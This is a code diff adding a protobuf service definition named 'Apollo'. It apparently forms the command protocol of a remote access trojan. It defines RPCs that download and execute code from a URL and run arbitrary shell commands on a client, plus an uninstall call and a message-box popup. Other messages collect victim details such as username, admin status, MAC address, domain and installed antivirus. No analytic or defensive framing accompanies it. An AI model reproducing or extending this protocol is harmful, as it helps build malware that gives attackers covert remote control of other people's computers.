@@ -1,0 +1,90 @@
+syntax = "proto3";
+
+package proto;
+
+service Apollo {
+	rpc GetClientInfo (GetClientInfoRequest) returns (GetClientInfoReply);
+	rpc DownloadAndExecute (DownloadAndExecuteRequest) returns (DownloadAndExecuteReply);
+	rpc Uninstall (UninstallRequest) returns (UninstallReply);
+	rpc RunShellCommand (RunShellCommandRequest) returns (RunShellCommandReply);
+}
+
+message GetClientInfoRequest {
+
+}
+message GetClientInfoReply {
+	string tag = 1;
+	string path = 2;
+	string version = 3;
+	string username = 4;
+	bool admin = 5;
+	string os = 6;
+	string hostname = 7;
+}
+
+message DownloadAndExecuteRequest {
+	string url = 1;
+}
+message DownloadAndExecuteReply {
+	string success = 1;
+	bool admin = 2;
+}
+
+message UninstallRequest {
+
+}
+message UninstallReply {
+	bool success = 1;
+}
+
+message RunShellCommandRequest {
+	string command = 1;
+}
+message RunShellCommandReply {
+	string output = 1;
+}
+
+message MessageBoxRequest {
+	string caption = 1;
+	string text = 2;
+	enum Button {
+		OK                  = 0;
+		OK_CANCEL           = 1;
+		ABORT_RETRY_IGNORE  = 2;
+		YES_NO_CANCEL       = 3;
+		YES_NO              = 4;
+		RETRY_CANCEL        = 5;
+	}
+	Button buttons = 3;
+	enum Icon {
+		ICON_HAND        = 0;
+		ICON_QUESTION    = 1;
+		ICON_EXCLAMATION = 2;
+		ICON_ASTERISK    = 3;
+		USER_ICON        = 4;
+	}
+	Icon icon = 4;
+}
+message MessageBoxReply {
+	bool success = 1;
+}
+
+message GetSystemInfoRequest {
+
+}
+message GetSystemInfoReply {
+	string os = 1;
+	string architecture = 2;
+	string cpu = 3;
+	string memory = 4;
+	string gpu = 5;
+	string username = 6;
+	string pc_name = 7;
+	string domain_name = 8;
+	string host_name = 9;
+	string local_ip = 10;
+	string time_zone = 11;
+	string mac_address = 12;
+	string anti_virus = 13;
+	int32 user_count = 14;
+}
